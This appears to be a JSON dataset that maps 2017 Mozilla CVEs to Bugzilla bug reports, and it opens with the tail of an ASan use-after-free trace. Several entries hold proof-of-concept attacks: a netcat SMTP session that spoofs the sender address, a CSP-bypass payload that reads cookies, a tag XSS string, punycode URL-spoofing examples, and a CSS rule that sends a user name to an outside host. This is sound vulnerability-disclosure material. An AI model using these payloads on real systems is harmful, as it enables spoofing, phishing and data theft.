0x7f818075c6ef in NS_NewBlockFrame(nsIPresShell*, nsStyleContext*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:300 #7 0x7f81804aaff3 in nsCSSFrameConstructor::ConstructNonScrollableBlockWithConstructor(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItem&, nsContainerFrame*, nsStyleDisplay const*, nsFrameItems&, nsBlockFrame* (*)(nsIPresShell*, nsStyleContext*)) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4955:32 #8 0x7f81804b47e7 in nsCSSFrameConstructor::ConstructNonScrollableBlock(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItem&, nsContainerFrame*, nsStyleDisplay const*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4921:10 #9 0x7f81804ae532 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:3845:7 #10 0x7f81804bb7e6 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6196:3 #11 0x7f8180497f14 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10640:5 #12 0x7f8180497f14 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10852 #13 0x7f81804a27fd in nsCSSFrameConstructor::ConstructBlock(nsFrameConstructorState&, nsIContent*, nsContainerFrame*, nsContainerFrame*, nsStyleContext*, nsContainerFrame**, nsFrameItems&, nsIFrame*, PendingBinding*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:11862:3 #14 0x7f81804ab4f2 in nsCSSFrameConstructor::ConstructNonScrollableBlockWithConstructor(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItem&, nsContainerFrame*, nsStyleDisplay const*, nsFrameItems&, nsBlockFrame* (*)(nsIPresShell*, nsStyleContext*)) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4957:3 #15 0x7f81804b47e7 in nsCSSFrameConstructor::ConstructNonScrollableBlock(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItem&, nsContainerFrame*, nsStyleDisplay const*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4921:10 #16 0x7f81804ae532 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:3845:7 #17 0x7f81804bb7e6 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6196:3 #18 0x7f8180497f14 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10640:5 #19 0x7f8180497f14 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10852 #20 0x7f81804a27fd in nsCSSFrameConstructor::ConstructBlock(nsFrameConstructorState&, nsIContent*, nsContainerFrame*, nsContainerFrame*, nsStyleContext*, nsContainerFrame**, nsFrameItems&, nsIFrame*, PendingBinding*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:11862:3 #21 0x7f818049ec58 in nsCSSFrameConstructor::ConstructDocElementFrame(mozilla::dom::Element*, nsILayoutHistoryState*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:2625:5 #22 0x7f81804c1ec6 in nsCSSFrameConstructor::ContentRangeInserted(nsIContent*, nsIContent*, nsIContent*, nsILayoutHistoryState*, bool) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7753:7 #23 0x7f8180670fc8 in PresShell::Initialize(int, int) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:1790:7 #24 0x7f81805d8a43 in nsDocumentViewer::InitPresentationStuff(bool) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:723:5 #25 0x7f81805eb4f6 in nsDocumentViewer::Show() /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2147:12 #26 0x7f8181375989 in SetVisibility /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6486:5 #27 0x7f8181375989 in non-virtual thunk to nsDocShell::SetVisibility(bool) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6476 #28 0x7f817c57bf0a in nsFrameLoader::Show(int, int, int, int, nsSubDocumentFrame*) /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:864:3 #29 0x7f8180983205 in nsSubDocumentFrame::ShowViewer() /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:188:9 #30 0x7f8180a01682 in AsyncFrameInit::Run() /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:90:7 #31 0x7f817c0e24ae in nsContentUtils::RemoveScriptBlocker() /home/worker/workspace/build/src/dom/base/nsContentUtils.cpp:5195:5 #32 0x7f818068a3d3 in ~nsAutoScriptBlocker /home/worker/workspace/build/src/obj-firefox/dist/include/nsContentUtils.h:2865:5 #33 0x7f818068a3d3 in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4168 #34 0x7f818039c02c in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1836:11 #35 0x7f81803a430a in DoTick /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1483:5 #36 0x7f81803a430a in DoRefresh /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:2257 #37 0x7f81803a430a in nsRefreshDriver::WillRefresh(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:2175 #38 0x7f818039ad66 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1798:7 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/layout/generic/nsIFrame.h:1125:12 in GetUsedBorderAndPadding Shadow bytes around the buggy address: 0x0c4a80140bd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c4a80140be0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c4a80140bf0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c4a80140c00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c4a80140c10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c4a80140c20: fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80140c30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80140c40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80140c50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80140c60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80140c70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==9825==ABORTING"
      }
    ],
    "CVE-2017-7829": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1423432",
        "title": "Mailsploit part 1: From addresses with encoded null character are cut off",
        "description": "Part of bug 1423430 https://www.mailsploit.com Reproduction: 1. Send yourself an email with SMTP: $ netcat ###YOUR.SMTP.SERVER### 25 MAIL FROM:<=?utf-8?b?cG90dXNAd2hpdGVob3VzZS5nb3Y=?==?utf-8?Q?=00?==?utf-8?b?cG90dXNAd2hpdGVob3VzZS5nb3Y=?=@mailsploit.com> RCPT TO: <###your.email.address@your.own.provider.not.gmail.and.co###> DATA From: =?utf-8?b?cG90dXNAd2hpdGVob3VzZS5nb3Y=?==?utf-8?Q?=00?==?utf-8?b?cG90dXNAd2hpdGVob3VzZS5nb3Y=?=@mailsploit.com To: moron@example.com Date: Wed, 6 December 2017 22:00:00 +0200 Subject: mailsploit Yeah, right. . QUIT 2. Open the email in Thunderbird Actual result: * The From field displays: \"potus@whitehouse.gov * If you click on the email address, you still see the same email address in the context menu. Expected result: * The From field displays: -potus-whitehouse.gov@mailsploit.com or even better: invalid@mailsploit.com Analysis: I think the bug here is that we cut the string off at an embedded null \\0 character. That might be in libmime or in JSMime. We need to find the place, and before that happens, we should strip the null character."
      }
    ],
    "CVE-2017-7831": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1392026",
        "title": "ExposedPropertiesOnly::check calls proxy traps \"has\" and \"getOwnPropertyDescriptor\" for property \"__exposedProps__\"",
        "description": "Open the browser console and enter this code: var proxy = new Proxy({}, new Proxy({}, {get: (_, trap) => (_, ...args) => { throw new Error(`proxy trap ${JSON.stringify(trap)} was called with arguments ${args.map(JSON.stringify).join(\", \")}.`); }})); var sandbox = Cu.Sandbox(null); sandbox.inheritsProxy = Object.create(proxy); sandbox.eval(`Reflect.apply(inheritsProxy, null, [])`); // Error: proxy trap \"has\" was called with arguments \"__exposedProps__\". sandbox.eval(`Reflect.defineProperty(inheritsProxy, \"a\", {})`); // Error: proxy trap \"has\" was called with arguments \"__exposedProps__\". sandbox.eval(`Reflect.deleteProperty(inheritsProxy, \"a\", {})`); // Error: proxy trap \"has\" was called with arguments \"__exposedProps__\". sandbox.eval(`Reflect.get(inheritsProxy, \"a\")`); // Error: proxy trap \"has\" was called with arguments \"__exposedProps__\". sandbox.eval(`Reflect.getOwnPropertyDescriptor(inheritsProxy, \"a\")`); // Error: proxy trap \"has\" was called with arguments \"__exposedProps__\". sandbox.eval(`Reflect.has(inheritsProxy, \"a\")`); // Error: proxy trap \"has\" was called with arguments \"__exposedProps__\". sandbox.eval(`Reflect.ownKeys(inheritsProxy)`); // Error: proxy trap \"has\" was called with arguments \"__exposedProps__\". sandbox.eval(`Reflect.set(inheritsProxy, \"a\", 1)`); // Error: proxy trap \"has\" was called with arguments \"__exposedProps__\". This should not happen. It does not happen if I use one of these: sandbox.inheritsProxy = Object.setPrototypeOf(function(){}, proxy); sandbox.inheritsProxy = Object.setPrototypeOf([], proxy); sandbox.inheritsProxy = proxy; Then I only get \"Permission denied\" errors. So how come the proxy trap runs with Object.create(proxy) ? The security wrapper is calling traps instead of protecting the proxy!! This seems like a flag of the security wrapper, so I'm marking this as security sensitive."
      }
    ],
    "CVE-2017-7832": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1408782",
        "title": "Potential \"visually perfect\" spoofing of the letter 'i' (with or without accents) in domain names",
        "description": "Any domain name that includes a letter \"i\" with an accent above (acute, grave, circumflex, dieresis, etc) can be perfectly spoofed using a sequence <dotless i, combining accent>, which is not canonically equivalent yet will display identically given reasonable font support. For example, http://xn--nave-6pa.com (http://naïve.com, with precomposed i-dieresis) could be spoofed by http://xn--nave-mza04z.com (http://naı̈ve.com, with dotless-i + dieresis) on any system where the font used by the URL bar supports such combining marks (true for both macOS and Windows, AFAIK, and probably most modern systems). IMO, this is a more important fix than some of the other potential spoofs that have been reported lately, as it does not depend on users overlooking a minor distinction, or on poor font support; rather, in the presence of fonts with good Unicode and diacritic support, the resulting spoof will (by definition) be visually perfect. Such URLs (any that include U+0131 DOTLESS I followed by a diacritic above) should be forced to display as punycode. (FTR, I have also filed an equivalent bug against Chromium, as their \"dangerous\" URL check doesn't currently catch such examples either.)"
      }
    ],
    "CVE-2017-7833": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1370497",
        "title": "URL spoofing using combining marks",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0 Build ID: 20170518000419 Firefox for Android Steps to reproduce: http://xn--google-yri.com/ Actual results: By adding this *ِ* (notice the weird thing under asterisk) we can actually spoof the URL (espicially the inexperienced users) More info: U+0650, ARABIC KASRA Expected results: The URL should be shown in PunnyCode or these letters should be banned."
      }
    ],
    "CVE-2017-7834": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1358009",
        "title": "Content-Security-Policy Bypass with data: URL opened in a new tab",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:53.0) Gecko/20100101 Firefox/53.0 Build ID: 20170413192749 Steps to reproduce: The Content-Security-Policy can be bypassed using a data: URL opened in a new tab. Content-Security-Policy doesn't allow javascript execution code on the webpage which uses this security, but in Firefox, if a data: URL is loaded in a new tab, the javascript code contained into this data URL is executed and it can steal the cookie of the website (and others malicious actions). example: <meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; script-src 'unsafe-eval'\"> <a href=\" data:text/html;html,<script>alert(document.cookie);</script>\">Open Me in a new tab</a> Actual results: The Content-Security-Policy can be bypassed if a data URL is opened into a new tab. Expected results: In Mozilla Firefox, if a Webpage uses the Content-Security-Policy security, javascript code shouldn't be executed with a data: URL opened in a new tab."
      }
    ],
    "CVE-2017-7837": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1325923",
        "title": "SVG image can be used to set cookie",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 Steps to reproduce: 1. Go to https://jsfiddle.net/26nLj6mL/1/ 2. Now go to https://shhnjk.com/ Actual results: https://shhnjk.com/ is not accessible and says \"Bad request\" due to Cookie bomb. Same attack can be done from https://vuln.shhnjk.com/svg_data.html. Expected results: Cookie should not be set by SVG image. Fix of https://insert-script.blogspot.ae/2016/12/firefox-svg-cross-domain-cookie.html only prevented setting cross domain cookie. But if site hosted svg image who has content disposition: attachment specified would be affected too. Same for the site who allows data URI in img tag."
      }
    ],
    "CVE-2017-7838": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1399540",
        "title": "Mozilla Firefox IDN display vulnerability",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0 Build ID: 20170824053838 Steps to reproduce: 1. Created the attached PoC HTML page, which contains a hyperlink to a fake A-label subdomain (xn--accountlogin) of a valid IDN (xn--google.com). 2. Opened the attached PoC HTML page in the latest released version of Firefox (55.0.3) 3. Hovered over the hyperlink 4. Observed the display of the hyperlink URL Actual results: The displayed URL was \"xn--accountlogin.xn--google.com\". Expected results: The displayed URL should be \"xn--accountlogin.䕮䕵䕶䕱.com\". An issue that makes this slightly more serious is that some URL scanning and phishing services will fail to detect the URL, since they assume the browser will display “xn--google.com” in its UNICODE format, and not its Punycode format, and that the URL is therefore not deceptive. They do this to avoid false positives for Punycode domains that happen by chance to have a deceptive substring, but are not themselves deceptive. The ability to force Firefox to display bare Punycode makes such URLs dangerous again. The attached Proof of Concept demonstrates that an attacker could register a Punycode spoof domain (such as xn--google.com) and then specify a Fake A-label subdomain so that the Punycode spoof domain name is displayed in its Punycode representation. In this proof of concept, we demonstrate that a Fake A-label subdomain of \"xn--accountlogin\" incorrectly causes the parent label \"xn--google\" to be rendered as Punycode. We expect the correct behavior to be that the rendering of parent name labels to be independent of child label values. In other words, we believe the correct rendering of this domain name to be \"xn--accountlogin.䕮䕵䕶䕱.com\", not \"xn--accountlogin.xn--google.com\". It should be noted that the latest released version of Chrome and Safari consistently display this domain name as \"䕮䕵䕶䕱.com\" regardless of child label values."
      }
    ],
    "CVE-2017-7839": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1402896",
        "title": "Specially-crafted JavaScript may be pasted into the address bar",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3223.0 Safari/537.36 Steps to reproduce: 1. Visit https://www.bayden.com/test/controlchars.html 2. Select all of the text in the box on the page *except* the first character 3. Copy 4. Go to Address bar. 5. Hit paste. Actual results: JavaScript is pasted and executes if enter is hit. Expected results: Text up to and including \"JavaScript:\" should be stripped. Firefox, like Chrome and IE, attempts to prevent the user from pasting JavaScript into the address bar. Unfortunately, as discovered in https://crbug.com/766010, these protections can be circumvented by introducing leading control characters into the string."
      }
    ],
    "CVE-2017-7840": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1366420",
        "title": "Javascript injection / XSS in bookmark export",
        "description": "It is possible to inject Javascript into the HTML export file of the bookmark manager via the Tags field. To reproduce: * Create a bookmark with a tag like \" onmouseover=\"alert(1)\" \" * Export bookmarks to HTML via bookmark manager * open bookmarks.html file and move over the bookmark This is almost certainly not intended and the tags should be properly escaped. I thought a while whether this would have any security implications. I couldn't come up with a realistic scenario where this matters, but one could construct less realistic scenarios (e.g. a publicly available firefox installation where the bookmarks of the users are regularly exported and uploaded to a webpage). So I'd say it's a very low severity security issue, but still should be fixed."
      }
    ],
    "CVE-2017-7842": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1397064",
        "title": "Referrer leaked even after setting referrer policy attribute",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Steps to reproduce: 1. Go to https://test.shhnjk.com/refpol.html Actual results: Referrer is leaked to cross-origin website. Expected results: https://bugzilla.mozilla.org/show_bug.cgi?id=1264165 added support for referrer policy attributes. But somehow <link> sends 2 requests, 1 with referrer and 1 without referrer, which bypasses this policy."
      }
    ],
    "CVE-2017-7843": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1410106",
        "title": "fingerprinting users in private window using web-worker + indexedDB",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36 Steps to reproduce: It's possible to fingerprint users in private window by first-party and third-party scripts 1. Can be tracked even after browser restarts. 2. Can be tracked even after user clears Everything. (history / cookies / offline data ) Demo: 1. Visit the test page in normal window and private window: https://cdn.cliqz.com/browser-f/fun-demo/test-webworker-indexed-db.html It increments visit count, from inside the web-worker and on the page. Both using indexedDB as the storage. Visit count this point should be 1. Meaning new unique visit. 2. Now restart the browser and visit the page again in both normal and private window. It increments the counter to 2. Which means private-window behaviour is not as intended. The expectation is that the user is still treated as a new user. Repeat the steps after selecting clearing everything in `clear recent history`, the counter still increments. Actual results: This is a serious bug, as it can be exploited for moving tracking from cookies to web-workers + indexedDB and have a persistent UUID. Which makes it possible to track a user irrespective of private window, across websites. Also, as per the MDN documentation and this bug: https://bugzilla.mozilla.org/show_bug.cgi?id=781982 , private window should not have access to IndexedDB but as demonstrated web workers are able to use IndexedDB Expected results: 1. Private window should not have access to IndexedDB even via web workers. 2. IndexedDB state should be cleaned after closing private window. Although if the user has disabled `always` accept third-party cookies, the attack is only possible as a first-party, but even then I think private window should not allow tracking even from a first-party perspective. Should also respect clear history / cookies / storage signal"
      }
    ],
    "CVE-2017-7844": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1420001",
        "title": "History leakage through anchors in SVG in canvas tags",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 Build ID: 20171120142222 Steps to reproduce: Demo: http://homepages.cs.ncl.ac.uk/dan.jackson/avisited/ ...you may need to reload a couple of times to make it work. 1. Place an <a> tag for each history sniffing attempt in an external SVG document (within a 'foreignObject' tag) 2. Create an <img> that references the SVG file 3. Draws that image to a <canvas> element 4. Try one/both of: a. look through the pixels to find the a:visited colour; or b. save the canvas as a (PNG) Blob to see if there is a file size difference (the unvisited colour is the same as the background colour, resulting in a smaller file). Actual results: The page is (at least after reloading) able to determine URLs I have previously visited. Expected results: The page should not be able to sniff the user's browsing history. In particular, it looks like other browsers render \"a:visited\" the same as \"a\" when drawing SVG to an image."
      }
    ],
    "CVE-2017-7845": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1402372",
        "title": "heap buffer overflow in VertexBuffer9 (ANGLE)",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 Steps to reproduce: I have attached the same PoC (Bug 1398381) which can be used to trigger a heap overflow in ANGLE. (You can disable hardware acceleration and test.) I have tested this on: 58 nightly build (should be applicable to the current stable build as well) libglesv2.dll!memcpy + ? (the exact offset is not known) (id: 72d) libglesv2.dll!rx::VertexBuffer9::storeVertexAttributes + 0x1D4 (id: 791) [[z:\\build\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\d3d9\\vertexbuffer9.cpp @ 109]] libglesv2.dll!rx::StreamingVertexBufferInterface::storeDynamicAttribute + 0x204 [[z:\\build\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\vertexbuffer.cpp @ 173]] libglesv2.dll!rx::VertexDataManager::storeDynamicAttrib + 0x240 [[z:\\build\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\vertexdatamanager.cpp @ 480]] libglesv2.dll!rx::VertexDataManager::storeDynamicAttribs + 0x25A [[z:\\build\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\vertexdatamanager.cpp @ 400]] libglesv2.dll!rx::VertexDataManager::prepareVertexData + 0x2DA [[z:\\build\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\vertexdatamanager.cpp @ 275]] libglesv2.dll!rx::Renderer9::applyVertexBuffer + 0x5E [[z:\\build\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\d3d9\\renderer9.cpp @ 1285]] libglesv2.dll!rx::Renderer9::genericDrawElements + 0x1A8 [[z:\\build\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\d3d9\\renderer9.cpp @ 2984]] libglesv2.dll!rx::Context9::drawElements + 0x47 [[z:\\build\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\d3d9\\context9.cpp @ 157]] libglesv2.dll!gl::Context::drawElements + 0x33 (inlined function) [[z:\\build\\build\\src\\gfx\\angle\\src\\libangle\\context.cpp @ 1654]] libglesv2.dll!gl::DrawElements + 0xB2 [[z:\\build\\build\\src\\gfx\\angle\\src\\libglesv2\\entry_points_gles_2_0.cpp @ 791]] xul.dll!mozilla::gl::GLContext::raw_fDrawElements + 0x1A (inlined function) [[z:\\build\\build\\src\\gfx\\gl\\glcontext.h @ 1101]] xul.dll!mozilla::gl::GLContext::fDrawElements + 0x26 [[z:\\build\\build\\src\\gfx\\gl\\glcontext.h @ 1115]] xul.dll!mozilla::WebGLContext::DrawElements + 0x13F [[z:\\build\\build\\src\\dom\\canvas\\webglcontextdraw.cpp @ 811]] xul.dll!mozilla::dom::WebGLRenderingContextBinding::drawElements + 0xB6 [[z:\\build\\build\\src\\obj-firefox\\dom\\bindings\\webglrenderingcontextbinding.cpp @ 16256]] xul.dll!mozilla::dom::GenericBindingMethod + 0x12A [[z:\\build\\build\\src\\dom\\bindings\\bindingutils.cpp @ 3061]] xul.dll!js::CallJSNative + 0xA3 (inlined function) [[z:\\build\\build\\src\\js\\src\\jscntxtinlines.h @ 293]] xul.dll!InternalCall + ? (the exact offset is not known) [[z:\\build\\build\\src\\js\\src\\vm\\interpreter.cpp @ 495]] xul.dll!js::CallFromStack + 0xD (inlined function) [[z:\\build\\build\\src\\js\\src\\vm\\interpreter.cpp @ 546]] xul.dll!js::jit::DoCallFallback + 0x24A [[z:\\build\\build\\src\\js\\src\\jit\\baselineic.cpp @ 2589]] 0x2E8E572D08E (no function symbol available) 0x18453FC480 (no function symbol available) 0x18453FC1B0 (no function symbol available) 0xFFFE01216EA6D940 (no function symbol available) 0xEEE4421FD838 (no function symbol available) 0x18453FC430 (no function symbol available) 0x18453FC3E8 (no function symbol available) 0x4 (no function symbol available) 0x18453FC3E8 (no function symbol available)"
      }
    ],
    "CVE-2017-7847": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1411708",
        "title": "TBE-01-012: RSS Local Path Leak via @-moz-document",
        "description": "It was found that the local path string is leaked via crafted CSS in the Thunderbird feed feature. Gecko supports the @-moz-document CSS at-rule 2 . This at-rule allows to apply CSS depending on the string included in the URL. On Windows, if the <link> element, which is used for the article URL, is not specified, the feed contents are loaded in mailbox:///C:/Users/[USER_NAME]/... including computer’s user-name. The following steps show that this [USER_NAME] string can be leaked via the @-moz-document rule. Steps to Reproduce: • Subscribe to the https://vulnerabledoma.in/pen/tb_-moz-document_pathleak.xml feed from one’s account. • Open the feed’s contents. • Confirm background requests. Observe the local path, including computer’s user- name, being sent to an external domain. PoC: <style> @-moz-document regexp(\"mailbox:///C:/Users/A.*$\") {.div1{background:url(https://cure53.de/?char1=A)}} @-moz-document regexp(\"mailbox:///C:/Users/B.*$\") {.div1{background:url(https://cure53.de/?char1=B)}} @-moz-document regexp(\"mailbox:///C:/Users/C.*$\") {.div1{background:url(https://cure53.de/?char1=C)}} @-moz-document regexp(\"mailbox:///C:/Users/D.*$\") {.div1{background:url(https://cure53.de/?char1=D)}} [...] </style> This PoC shows how it is first attempted to get the initial ten characters from user-name string on the local path. Assuming a victim with a user-name \"Masato\", the following requests will be sent: GET https://cure53.de/?char1=M HTTP/1.1 GET https://cure53.de/?char1=a HTTP/1.1 GET https://cure53.de/?char1=s HTTP/1.1 GET https://cure53.de/?char1=a HTTP/1.1 GET https://cure53.de/?char1=t HTTP/1.1 GET https://cure53.de/?char1=o HTTP/1.1 It seems that there is a plan to remove the @-moz-document rule 3 , but this has not been implemented so far. Therefore, it is recommended to disable the use of @-moz-document rule from web content. This will help ensure that an attacker cannot abuse the power of regular expressions by combining them with seemingly harmless CSS in seeking to match and exfiltrate valuable data."
      }
    ]
  }
}